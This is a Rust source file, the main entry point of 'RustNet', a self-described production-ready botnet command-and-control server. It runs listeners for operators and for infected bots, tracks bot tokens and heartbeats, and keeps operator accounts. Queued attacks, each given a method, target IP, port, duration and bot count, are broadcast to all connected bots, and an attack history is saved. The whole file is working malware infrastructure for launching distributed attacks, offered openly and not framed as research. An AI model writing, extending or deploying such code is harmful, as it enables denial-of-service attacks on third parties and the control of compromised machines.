// RustNet Server - Production-ready C&C server implementation
mod modules {
    pub mod auth;
    pub mod client_manager;
    pub mod config;
    pub mod error;
    pub mod validation;
    pub mod bot_manager;
    pub mod attack_manager;
    pub mod tls;
    pub mod rate_limiter;
    pub mod state;
    pub mod commands;
    pub mod connection_handler;
}

use tokio::net::TcpListener;
use std::sync::Arc;
use std::time::Duration;
use tracing::{info, warn, error, debug};
use tracing_subscriber::{layer::SubscriberExt, util::SubscriberInitExt};

use modules::auth::{Level, random_string, set_title, migrate_plaintext_passwords_at, 
           LoginAttemptTracker, UserManager};
use modules::client_manager::ClientManager;
use modules::config::Config;
use modules::error::{CncError, Result};
use modules::bot_manager::BotManager;
use modules::attack_manager::AttackManager;
use modules::rate_limiter::SimpleRateLimiter;
use modules::tls::setup_tls;
use modules::state::AppState;
use modules::connection_handler::{handle_user_connection, handle_bot_connection};
use modules::commands::{registry::CommandRegistry, impls::register_all};

// Determine config directory - check current dir first, then fallback to executable's parent
fn get_config_dir() -> std::path::PathBuf {
    let current_dir = std::env::current_dir().unwrap_or_default();
    
    // Check if config/ exists in current directory
    let config_in_current = current_dir.join("config");
    if config_in_current.exists() {
        return config_in_current;
    }
    
    // Check if we're in target/release or target/debug - go up to project root
    if current_dir.ends_with("release") || current_dir.ends_with("debug") {
        if let Some(target_dir) = current_dir.parent() {
            if let Some(project_root) = target_dir.parent() {
                let config_path = project_root.join("config");
                if config_path.exists() {
                    return config_path;
                }
            }
        }
    }
    
    // Fallback: create config/ in current directory
    let config_dir = current_dir.join("config");
    std::fs::create_dir_all(&config_dir).ok();
    config_dir
}

const BOT_HEARTBEAT_INTERVAL: Duration = Duration::from_secs(5);
const CLEANUP_INTERVAL: Duration = Duration::from_secs(60);
const BOT_TIMEOUT_SECS: i64 = 30;

#[tokio::main]
async fn main() -> Result<()> {
    // Initialize logging
    let config = Config::load();
    
    tracing_subscriber::registry()
        .with(tracing_subscriber::EnvFilter::new(
            std::env::var("RUST_LOG").unwrap_or_else(|_| config.log_level.clone()),
        ))
        .with(tracing_subscriber::fmt::layer())
        .init();

    info!("🦀 RustNet CnC Server v2.0 - Production Ready");
    info!("========================================");
    
    // Determine config directory and users file path
    let config_dir = get_config_dir();
    let users_file = config_dir.join("users.json");
    let users_file_str = users_file.to_string_lossy().to_string();
    let bot_tokens_file = config_dir.join("bot_tokens.json");
    let bot_tokens_file_str = bot_tokens_file.to_string_lossy().to_string();
    let audit_file = config_dir.join("audit.log");
    let audit_file_str = audit_file.to_string_lossy().to_string();
    
    info!("📁 Config directory: {}", config_dir.display());
    info!("📄 Users file: {}", users_file.display());
    info!("🤖 Bot tokens file: {}", bot_tokens_file.display());
    info!("📋 Audit log: {}", audit_file.display());
    
    // Validate configuration
    if let Err(e) = config.validate() {
        error!("Configuration validation failed: {}", e);
        return Err(CncError::ConfigError(e));
    }
    info!("[OK] Configuration loaded successfully");
    
    // Setup TLS if enabled
    let tls_acceptor = if config.enable_tls {
        info!("Setting up TLS encryption...");
        match setup_tls(&config.cert_path, &config.key_path).await {
            Ok(acceptor) => {
                info!("[OK] TLS encryption enabled");
                Some(Arc::new(acceptor))
            }
            Err(e) => {
                error!("Failed to setup TLS: {}", e);
                error!("TLS is required but setup failed. Server cannot start.");
                return Err(e);
            }
        }
    } else {
        warn!("=================================================================");
        warn!("⚠️  CRITICAL SECURITY WARNING: TLS IS DISABLED");
        warn!("=================================================================");
        warn!("   Passwords and commands will be sent in CLEARTEXT.");
        warn!("   This configuration is UNSAFE for production use.");
        warn!("   Enable TLS in server.toml immediately for internet access.");
        warn!("=================================================================");
        None
    };
    
    // Initialize UserManager
    let user_manager = Arc::new(UserManager::new(users_file_str.clone()));

    // Migrate plaintext passwords if needed
    info!("Checking for password migrations...");
    migrate_plaintext_passwords_at(&users_file_str).await?;
    
    // Load users
    if let Err(e) = user_manager.load_users().await {
        warn!("Failed to load users: {}", e);
    }

    // Check database integrity (duplicates, etc.)
    info!("Checking database integrity...");
    match user_manager.check_database_integrity().await {
        Ok(warnings) => {
            if !warnings.is_empty() {
                warn!("Database integrity issues found:");
                for warning in warnings {
                    warn!("  - {}", warning);
                }
            } else {
                info!("[OK] Database integrity check passed");
            }
        }
        Err(e) => {
            warn!("Database integrity check failed: {}", e);
        }
    }
    
    // Check if users.json exists, if not create root user
    if tokio::fs::metadata(&users_file).await.is_err() {
        info!("No users.json found, creating root user...");
        let password = random_string(16);
        
        match user_manager.add_user(
            "root".to_string(),
            &password,
            chrono::Utc::now() + chrono::Duration::days(40000),
            Level::Owner,
        ).await {
            Ok(_) => {
                warn!("=================================================================");
                warn!("  ROOT CREDENTIALS - SAVE THESE SECURELY!");
                warn!("=================================================================");
                warn!("  Username: root");
                warn!("  Password: {}", password);
                warn!("=================================================================");
            },
            Err(e) => error!("Failed to create root user: {}", e),
        }
    }
    
    // Initialize managers
    let state = Arc::new(AppState::new(
        config.clone(),
        Arc::new(BotManager::new(config.max_bot_connections, bot_tokens_file_str)),
        Arc::new(ClientManager::new(config.max_user_connections)),
        Arc::new(AttackManager::new(config.max_attacks, config.attack_cooldown_secs, config.max_attack_duration_secs)),
        Arc::new(SimpleRateLimiter::new(10)),  // 10 connections per minute per IP
        user_manager,
        tls_acceptor,
        audit_file_str,
        Arc::new(LoginAttemptTracker::new()),
    ));

    // Initialize Command Registry
    let mut registry = CommandRegistry::new();
    register_all(&mut registry);
    let registry = Arc::new(registry);
    
    // Load bot tokens
    if let Err(e) = state.bot_manager.load_tokens().await {
        warn!("Failed to load bot tokens: {}", e);
    }
    
    // Load attack history if it exists
    let history_file = config_dir.join("attack_history.json");
    let history_file_str = history_file.to_string_lossy().to_string();
    if let Err(e) = state.attack_manager.load_history(&history_file_str).await {
        warn!("Failed to load attack history: {}", e);
    } else {
        info!("[OK] Attack history loaded");
    }
    
    // Start periodic cleanup task
    let state_clone = state.clone();
    tokio::spawn(async move {
        periodic_cleanup(state_clone).await;
    });
    
    // Start CnC server
    info!("🌐 Starting User server on {}:{}", config.user_server_ip, config.user_server_port);
    let user_listener = TcpListener::bind(format!("{}:{}", config.user_server_ip, config.user_server_port)).await?;
    
    // Start bot server
    info!("🤖 Starting Bot server on {}:{}", config.bot_server_ip, config.bot_server_port);
    let bot_listener = TcpListener::bind(format!("{}:{}", config.bot_server_ip, config.bot_server_port)).await?;
    
    info!("✓ All servers started successfully");
    info!("========================================");
    
    // Setup graceful shutdown
    let shutdown = async {
        match tokio::signal::ctrl_c().await {
            Ok(()) => {},
            Err(e) => error!("Failed to listen for shutdown signal: {}", e),
        }
    };
    tokio::pin!(shutdown);
    
    // Spawn title updater
    let state_clone = state.clone();
    let title_task = tokio::spawn(async move {
        update_titles(state_clone).await;
    });
    
    // Start queue processor
    let state_clone = state.clone();
    tokio::spawn(async move {
        loop {
            if let Some(request) = state_clone.attack_manager.process_queue().await {
                match state_clone.attack_manager.start_attack(
                    request.method.clone(),
                    request.ip,
                    request.port,
                    request.duration_secs,
                    request.username.clone(),
                    request.bot_count
                ).await {
                    Ok(id) => {
                        info!("Started queued attack {} for user {}", id, request.username);
                        state_clone.bot_manager.broadcast_attack(&request.method, &request.ip.to_string(), request.port, request.duration_secs).await;
                    }
                    Err(e) => {
                        warn!("Failed to start queued attack: {}", e);
                    }
                }
            }
            tokio::time::sleep(Duration::from_secs(1)).await;
        }
    });
    
    // User connection handler
    let state_clone = state.clone();
    let registry_clone = registry.clone();
    let user_task = tokio::spawn(async move {
        loop {
            match user_listener.accept().await {
                Ok((conn, addr)) => {
                    info!("👤 User connection from {}", addr);
                    let state = state_clone.clone();
                    let registry = registry_clone.clone();
                    tokio::spawn(async move {
                        if let Err(e) = handle_user_connection(conn, addr.to_string(), state, registry).await {
                            error!("User connection error: {}", e);
                        }
                    });
                }
                Err(e) => error!("Error accepting user connection: {}", e),
            }
        }
    });
    
    // Bot connection handler
    let state_clone = state.clone();
    let bot_task = tokio::spawn(async move {
        loop {
            match bot_listener.accept().await {
                Ok((conn, addr)) => {
                    info!("🤖 Bot connection from {}", addr);
                    let state = state_clone.clone();
                    tokio::spawn(async move {
                        if let Err(e) = handle_bot_connection(conn, addr, state).await {
                            error!("Bot connection error: {}", e);
                        }
                    });
                }
                Err(e) => error!("Error accepting bot connection: {}", e),
            }
        }
    });
    
    // Wait for shutdown signal
    tokio::select! {
        _ = shutdown => {
            info!("🛑 Shutdown signal received, gracefully shutting down...");
            
            // Cancel background tasks
            title_task.abort();
        }
        _ = user_task => {
            error!("User server task terminated unexpectedly");
        }
        _ = bot_task => {
            error!("Bot server task terminated unexpectedly");
        }
    }
    
    // Perform cleanup
    info!("📊 Final statistics:");
    info!("   Bots: {}", state.bot_manager.get_bot_count().await);
    info!("   Clients: {}", state.client_manager.get_client_count().await);
    info!("   Active attacks: {}", state.attack_manager.get_active_count().await);
    
    // Save attack history before shutdown
    let history_file = config_dir.join("attack_history.json");
    let history_file_str = history_file.to_string_lossy().to_string();
    if let Err(e) = state.attack_manager.save_history(&history_file_str).await {
        warn!("Failed to save attack history: {}", e);
    } else {
        info!("[OK] Attack history saved");
    }
    
    info!("✓ Server shutdown complete");
    
    Ok(())
}

async fn periodic_cleanup(state: Arc<AppState>) {
    let mut interval = tokio::time::interval(CLEANUP_INTERVAL);
    
    loop {
        interval.tick().await;
        
        // Cleanup finished attacks
        state.attack_manager.cleanup_finished().await;
        
        // Cleanup dead bots
        state.bot_manager.cleanup_dead_bots(BOT_TIMEOUT_SECS).await;
        
        // Cleanup inactive client sessions
        state.client_manager.cleanup_inactive(state.config.read().await.session_timeout_secs).await;
        
        // Cleanup old rate limit entries
        state.rate_limiter.cleanup_old_entries().await;
        
        // Cleanup old login attempts
        state.login_tracker.cleanup_old_attempts().await;
        
        let bot_count = state.bot_manager.get_bot_count().await;
        let client_count = state.client_manager.get_client_count().await;
        let attack_count = state.attack_manager.get_active_count().await;
        
        debug!("Cleanup: {} bots, {} clients, {} attacks", bot_count, client_count, attack_count);
    }
}

async fn update_titles(state: Arc<AppState>) {
    let spin_chars = ['∴', '∵'];
    let mut spin_index = 0;
    
    loop {
        tokio::time::sleep(Duration::from_secs(2)).await;
        
        let clients = state.client_manager.get_all_clients().await;
        let bot_count = state.bot_manager.get_bot_count().await;
        let attack_count = state.attack_manager.get_active_count().await;
        
        for client in clients {
            let title = format!(
                "    [{}]  Servers: {} | Attacks: {}/{} |  ☾☼☽  | User: {} ({}) [{}]",
                spin_chars[spin_index],
                bot_count,
                attack_count,
                state.config.read().await.max_attacks,
                client.user.username,
                client.user.get_level().to_str(),
                spin_chars[spin_index]
            );
            
            let title_seq = set_title(&title);
            let _ = client.try_write(title_seq.as_bytes()).await;
        }
        
        spin_index = (spin_index + 1) % spin_chars.len();
    }
}
